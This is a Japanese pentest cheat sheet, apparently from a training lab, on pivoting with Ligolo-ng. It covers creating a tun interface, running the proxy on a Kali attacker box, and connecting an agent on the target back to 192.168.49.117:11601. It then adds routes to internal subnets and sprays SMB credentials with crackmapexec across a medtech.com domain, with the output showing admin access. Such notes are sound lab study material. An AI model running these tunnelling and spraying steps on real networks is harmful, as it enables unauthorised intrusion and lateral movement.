# Ligolo-ng

# インターフェースの作成と起動
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```
---

# Kaliマシン - 攻撃者マシン
## Basic
```bash
cp ~/github/Tools/Tunnel/ligolo-ng/proxy/ligolo-ng_proxy_0.8.3_linux_amd64/proxy . 
./proxy -selfcert
```

## ポート指定（22の場合）
```zsh
~/github/Tools/Tunnel/ligolo-ng/proxy/ligolo-ng_proxy_0.8.3_linux_amd64/proxy -selfcert -laddr 0.0.0.0:22
```
---

# WindowsまたはLinuxマシン - 攻撃対象マシン
## Windows
```bash
.\agent.exe -connect 192.168.49.117:11601 -ignore-cert
```
## Linux
```
./agent -connect 192.168.49.117:11601 -ignore-cert
```

# Ligolo-ngコンソールでの操作
```zsh
session #select host
ifconfig #内部ネットワークのサブネットをメモする
start #関連するサブネットをligoloインターフェースに追加後に開始
```

# routeの追加
上記でstartを実行しないとLinｋはupにならない
```zsh
sudo ip route add 172.16.182.0/24 dev ligolo

sudo ip route add 10.10.162.0/24 dev ligolo

ip route

default via 192.168.11.1 dev eth0 proto static metric 100 
172.16.182.0/24 dev ligolo scope link 
192.168.11.0/24 dev eth0 proto kernel scope link src 192.168.11.99 metric 100 
192.168.45.0/24 dev tun0 proto kernel scope link src 192.168.45.201 
192.168.182.0/24 via 192.168.45.254 dev tun0 

```

# 活用例

## crackmapexec
```zsh
crackmapexec smb 172.16.182.0/24 -u joe -p "Flowers1"         
SMB         172.16.182.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.182.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.182.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.182.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.182.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.182.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
SMB         172.16.182.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
SMB         172.16.182.254  445    WEB02            [*] Windows Server 2022 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.182.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
SMB         172.16.182.12   445    DEV04            [+] medtech.com\joe:Flowers1 
SMB         172.16.182.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
SMB         172.16.182.13   445    PROD01           [+] medtech.com\joe:Flowers1 
SMB         172.16.182.10   445    DC01             [+] medtech.com\joe:Flowers1 
SMB         172.16.182.254  445    WEB02            [+] medtech.com\joe:Flowers1
```
# Kali Linuxでのサブネット追加
```bash
sudo ip r add <subnet> dev ligolo
```

---
